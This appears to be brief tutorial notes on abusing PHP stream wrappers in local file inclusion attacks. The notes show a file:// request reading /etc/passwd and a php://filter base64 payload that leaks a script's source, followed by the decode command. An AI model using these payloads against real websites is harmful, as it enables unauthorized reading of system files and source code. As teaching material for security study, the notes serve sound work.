The wrappers that we use are made on php.

Wrappers "involves" packets on different protocols for work on different places of the system for example 

We use it when we cannot see some file even if the site are vulnerable for example to local file inclusion (LFI) 

There are a lot of wrappers

## WRAPPER FILE:##
```
one of them are :
localhost/example.php?file:///etc/passwd
```
## FILTER: ##
This works when we cannot se the content of a file, imagine that we have a file 
```
<?php
   system('whoami') //this is a comment
?>
```

if you point to that webiste you will see www-data but you wont be able to watch the code, or other things behind of this script.

We only see the output of this script:
```
www-data
```
How can we see all ?

We can do a filter on base64 like this
```
localhost/example.php?file=php://filter/convert.base64-encode/resource=example2.php
```

Now we cant see  www-data, we see this

```
PD9waHAKICAgc3lzdGVtKCd3aG9hbWknKSAvL3RoaXMgaXMgYSBjb21tZW50Cj8+Cg==
```
To decode this we use :

echo (shows on the console something) 
-d (decode)

```
echo "PD9waHAKICAgc3lzdGVtKCd3aG9hbWknKSAvL3RoaXMgaXMgYSBjb21tZW50Cj8+Cg==" | base64 -d; echo
```

This is the result of decoding it. As you can see, we see the script and we can even see the comments of the code.

```
<?php
   system('whoami') //this is a comment
?>

```